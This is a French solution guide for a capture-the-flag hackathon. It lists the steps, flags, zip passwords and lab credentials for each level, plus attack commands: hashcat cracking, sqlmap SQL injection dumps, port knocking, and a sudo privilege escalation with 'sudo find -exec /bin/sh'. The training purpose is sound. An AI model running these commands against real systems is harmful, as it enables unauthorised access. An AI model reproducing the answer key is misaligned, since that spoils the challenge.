![separe](https://github.com/studoo-app/.github/blob/main/profile/studoo-banner-logo.png)
# Hackathon 2026 - The Rooms - SOLUTION
[![Version](https://img.shields.io/badge/Version-2026-blue)]()

## Solution détaillée

### Niveau 1: Exploration systèmes Linux

- lister les fichiers et dossiers cachés avec `ls -la`
- trouver le dossier caché `.secrets/.hidden` et accéder à son contenu
- trouver le fichier `secret-key.txt` et son contenu afin de décompresser l'archive `secret.zip
- décompresser l'archive `secret.zip` pour trouver le mot de passe du niveau suivant
- Le fichier backup_credentials.txt est un leurre, il contient des informations fausses pour détourner les participants

**Décompression de l'archive:**
```bash
  unzip -P 9VOsfCMsHhAiIohU secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{h1dd3n_1n_pl41n_s1ght}
- contenu du fichier key_part.txt : 2004d30b5bf80c80b70fa660d35236cf036e9a12cb538c381a6ca42531
- contenu du fichier next_level.txt : 
  - Host : 10.100.0.4 
  - User : roger 
  - Pass : LQU8PvANkAuYitkQ


### Niveau 2: Authentification SSH par clé privée

- lister les fichiers et dossiers cachés avec `ls -la`
- trouver le dossier caché `.confidential/.hidden` et accéder à son contenu
- trouver le fichier `key_rsa` et l'utiliser pour se connecter en SSH au niveau suivant
- Le dossier `.keys` est un leurre, il contient des clés privées qui ne fonctionnent pas

**Commande pour se connecter en SSH avec la clé privée:**
```bash
# se rendre dans /confidential/.hidden
ssh -i key_rsa yvette@10.100.2.4
```

**Décompression de l'archive:**
```bash
  unzip -P UDc4kyqHxurVDnYt secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{pr1v4t3_k3y_unl0ck3d}
- contenu du fichier key_part.txt : 56be19ce1cb509ba7aed832808c32eaefbc03bcae0e648c80f632df5a2
- contenu du fichier next_level.txt :
    - Host : 10.100.0.5
    - User : bernard
    - Pass : gLCGN9pvWG1EY7MR

### Niveau 3: Détecter le / les cryptages utilisés et décoder des messages


- lister les fichiers et dossiers cachés avec `ls -la`
- trouver le dossier caché `.vault` et accéder à son contenu
- Le fichier `encrypted_message` contient un message chiffré, il faut détecter le type de chiffrement utilisé le déchiffrer
- Etape 1 : Décoder le message qui en est encodé en base64
- Etape 2 : reperer le param password dans la chaine obtenu, ainsi que le param algo
- Etape 3 : Utiliser hashcat pour cracker le mot de passe en utilisant l'algo spécifié (md5) et le fichier dictionnaire rockyou.txt
  - `hashcat -m 0 -a 0 <hash> dicts/rockyou.txt`

**Décompression de l'archive:**
```bash
  unzip -P a3to1NNUGu84xTv5 secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{3ncrypt10n_15_n0t_s3cur1ty}
- contenu du fichier key_part.txt : 3f029476da49ed23e7df325728817e34204a56b80da3403d3b5f67dd31
- contenu du fichier next_level.txt :
    - Host : 10.100.0.6
    - User : gerard
    - Pass : AHslMhf94Rsm5rJj

### Niveau 4: Naviguer dans le labyrinthe et trouver la sortie

- Pour trouver la sortie du labyrinthe, il faut se suivre les IPs se terminant par des nombre premiers dans l'ordre croissant
- Il est possible de trouver ces IPs en analysant le reseau avec nmap, ensuite les fichiers de configuration SSH des différents nœuds du labyrinthe, chaque fichier conntient une restriction d'accès à une IP spécifique
- Voici la liste des IPs à suivre pour trouver la sortie du labyrinthe:
  - 10.100.4.17 (node 0)
  - 10.100.4.23 (node 1)
  - 10.100.4.31 (node 3)
  - 10.100.4.37 (node 5)
- Les autres IPs sont des leurres, elles ne mènent à rien ou à des impasses

**Décompression de l'archive:**
```bash
  unzip -P rtCR0iSQKclZrLUA secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{pr0xy_jump_m4st3r}
- contenu du fichier key_part.txt : 505fd43db1caeefd8413ffd4e6524589643cc706132a9b9443dc3c351a
- contenu du fichier next_level.txt :
    - Host : 10.100.0.7
    - User : josiane
    - Pass : OLZkJEQWY6rNO9Uf

### Niveau 5: Utiliser le social engineering pour obtenir des informations et cracker un mot de passe

Le mot de passe à cracker est contenu dans le ficher home/lvl05/security/hash.txt. Ce dernier est encodé en sha512.

Le but ici est de construire un dictionnaire à analysant les données dispersées dans les différentes dossiers.
Il apparait alors qu'il ya une plus grande somme d'informations pour l'employé Alice Martin, et que le contenu de ces 
documents parlent souvent de son voyage à Tokyo en 2019.

En associant ces informations et la note sur la potilitique de mot de passe, on peut faire l'hypothèse que le mot de passe
d'Alice Martin est une variation autour de ce voyage à Tokyo en 2019. 

Mot de passe : Tokyo2019!

Commande hashcat pour cracker le mot de passe:
```bash
hashcat -m 1800 -a 0 <hash> -o cracked_passwords.txt
# -m 1800 : spécifie le type de hash (sha512)
```

**Décompression de l'archive:**
```bash
  unzip -P Tokyo2019! secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{s0c14l_h4ck_c0mpl3t3}
- contenu du fichier key_part.txt : 72944cb22bc3a3478b10409ee2048e1ab72773608b9cf0dcc6d410fe5e
- contenu du fichier next_level.txt :
    - Host : 10.100.0.9
    - User : jacqueline
    - Pass : cBFxcBRyheV9AeZ9

### Niveau 6: Trouver la bonne séquence

**WORK IN PROGRESS**
**Niveau supprimé de la version 1**

### Niveau 7: Attaquer la base de données d'un site web

Requeter le site web via curl afin de forger une commande sqlmap afin de s'injecter dans la base de données

```bash
# 1 - Curl initial pour analyser la réponse et trouver le parametre vulnérable
curl -i "http://10.100.7.4"

# 2. Détecter la vulnérabilité SQLi et lancer l'attaque avec sqlmap
sqlmap -u "http://10.100.7.4?search=test" --batch

# 3. Lister les bases
sqlmap -u "http://10.100.7.4?search=test" --dbs --batch

# 4. Lister les tables de la base recettes_db
sqlmap -u "http://10.100.7.4?search=test" -D recettes_db --tables --batch
# Output: users, credentials, system_access

# 5. Dumper la table recettes de la base recettes_db
sqlmap -u "http://localhost/api/search.php?id=1" -D recettes_db -T recettes --dump --batch

# 6. Trouver le binaire caché dans les recettes

"1010100 1101000 1100101 100000 1110000 1100001 1110011 1110011 1110111 1101111 1110010 1100100 100000 1111001 1101111
 1110101 100000 1101100 1101111 1101111 1101011 1101001 1101110 1100111 100000 1100110 1101111 1110010 100000 1101001
 1110011 100000 111010 100000 1111001 1010010 1110110 110111 1001100 1000010 1110100 1100101 110110 1110010 1000101
 110100 1111010 1111000 1101110 1011001"

# 7. Le convertir en texte clair pour trouver la passphrase de la clé ssh

"The password you looking for is : yRv7LBte6rE4zxnY"

```
**Décompression de l'archive:**
```bash
  unzip -P yRv7LBte6rE4zxnY secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{s0c14l_h4ck_c0mpl3t3}
- contenu du fichier key_part.txt : 71c9a180f2837390eca626ac3134bef6dea4c911158343204b77c74ffe
- contenu du fichier next_level.txt :
    - Host : 10.100.0.10
    - User : huguette
    - Pass : LQU8PvANkAuYitkQ

### Niveau 8: Knock Knock Knock Knock Knock, Who's There?

La room se déroule en deux phases :

- Phase 1 : Reconnaissance sur node-01, exploitation de la misconfig sudo, récupération de la séquence de knock et de la clé SSH
- Phase 2 : Port knocking sur node-02, connexion SSH avec la clé récupérée, escalade de lecture pour le flag final

**Phase 1**

Une partie des informations sont disséminées dans les fichiers perso de huguette, il faudra comprendre que des infos plus complètes sont
disponibles dans les fichiers root, et que pour y accéder il faut utiliser sudo cat. (Sudo Misconfig)
Une fois les infos récupérées ( compte utilisateur, clé ssh, séquence de knock, adresse IP), il faudra faire du port knocking
pour se connecter à la machine suivante.

```bash 
    knock 10.100.8.3 1789 3615 4242 7331 9999
    ssh -i .ssh/id_rsa colette@10.100.8.3
```

**Phase 2**

Le fichier secret-key.txt se trouve dans le dossier root/docs, pour y accéder il faut encore une fois faire une elevation de privilèges.
La commande find permet en mode sudo de copier des fichiers depuis root vers le dossier personnel de huguette.

```bash
      # Démarrer une session root
      sudo find . -exec /bin/sh \; -quit
```

**Décompression de l'archive:**
```bash
  unzip -P AMZ63JYowitEDcf secret.zip

# Archive:  secret.zip
# extracting: flag.txt
# inflating: key_part.txt
# extracting: next_level.txt
```

#### Infos à récupérer pour le niveau suivant:

- Flag : FLAG{sud0_m1sc0nf1g_ru1n3d_my_d4y}
- contenu du fichier key_part.txt : 33aadef362bd9fb690c880386789e1af027233ffe5fabed372b1a2b5c1
- contenu du fichier next_level.txt :
    - Host : 10.100.0.11
    - User : monique
    - Pass : MBjHcQ02uyXSFrmH


### Niveau 9: The End

Vous avez triomphé de tous les défis et vous êtes arrivé à la fin du labyrinthe. Félicitations !
